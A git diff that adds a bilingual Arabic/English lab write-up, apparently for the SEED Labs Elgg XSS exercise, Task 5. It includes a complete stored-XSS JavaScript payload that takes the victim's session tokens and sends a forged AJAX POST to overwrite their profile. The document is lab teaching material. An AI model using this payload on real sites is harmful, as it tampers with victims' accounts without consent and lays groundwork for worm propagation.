@@ -220,3 +220,63 @@ http://www.seed-server.com
    * تسجيل الخروج والدخول بحساب ضحية آخر (مثل Bob)، ثم زيارة صفحة سامي الشخصية للتأكد من إضافة سامي تلقائياً لقائمة أصدقاء الضحية.
    
    ![login-2](test-7.png)
+
+
+   # README - Task 5: Modifying the Victim's Profile
+
+## 📌 1. فكرة التاسك والأهداف (Task Concept & Objectives)
+* **الفكرة العامة:** تطويع هجمات الـ XSS لتعديل الملف الشخصي للمستخدم الضحية (`Victim's Profile`) تلقائياً بمجرد زيارته لصفحة المهاجم (سامي)، وهو التصعيد الثاني نحو بناء الدودة السيبرانية المتكاملة.
+* **السيناريو الذكي:** 
+  * إرسال طلب `POST Request` مخفي عبر المتصفح باستخدام `AJAX` يغير محتوى خانة "About Me" الخاصة بالضحية دون علمه.
+* **الأهداف:**
+  1. صياغة طلب POST وإرسال البيانات مع رموز الحماية والتأكد من توافق الـ Content-Type.
+  2. فهم دور الشرط البرمجي في منع الحلقات التكرارية اللانهائية (Infinite Loops) عندما يزور المهاجم صفحته الخاصة.
+
+---
+
+## 📌 1. Task Concept & Objectives (English)
+* **General Idea:** Forging an attack to automatically modify the victim's profile data upon visiting the attacker's page, serving as the second milestone towards a self-propagating worm.
+* **The Attacker Scenario:** 
+  * Sending a forged `POST Request` via background `AJAX` to overwrite the victim's "About Me" field without their consent.
+* **Objectives:**
+  1. Construct and dispatch an HTTP POST request with appropriate tokens and content type headers.
+  2. Understand the necessity of safety checks to prevent infinite execution loops when the attacker visits their own profile.
+
+---
+
+## 🛠️ 2. خطوات التنفيذ العملية (Step-by-Step Implementation)
+1. تسجيل الدخول بحساب **Samy** والانتقال لصفحة تعديل الملف الشخصي وتفعيل وضع **Edit HTML**.
+2. إدخال السكريبت البرمجي المكتمل مع تعبئة المتغيرات ورابط الـ POST المناسب:
+   ```html
+   <script type="text/javascript">
+   window.onload = function () {
+     var userName="&name="+elgg.session.user.name;
+     var guid="&guid="+elgg.session.user.guid;
+     var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+     var token="&__elgg_token="+elgg.security.token.__elgg_token;
+     var content = token + ts + userName + '&description=Samy is my hero';
+     var samyGuid = 59;
+     var sendurl = "[http://www.seed-server.com/action/profile/edit](http://www.seed-server.com/action/profile/edit)";
+
+     if (elgg.session.user.guid != samyGuid) 
+     {
+         var Ajax = null;
+         Ajax = new XMLHttpRequest();
+         Ajax.open("POST", sendurl, true);
+         Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+         Ajax.send(content);
+     }
+   }
+   </script>
+   ```
+   * حفظ التغييرات (Save).
+   
+تسجيل الخروج والدخول بحساب ضحية آخر (مثل Bob)، ثم زيارة صفحة سامي.
+
+*الانتقال إلى ملف Bob الشخصي للتأكد من تغير خانة الوصف تلقائياً إلى النص المحدد.
+   ![login-2](test-8.png)
+   ![login-2](test-9.png)
+   ![login-2](test-10.png)
+   
+
+
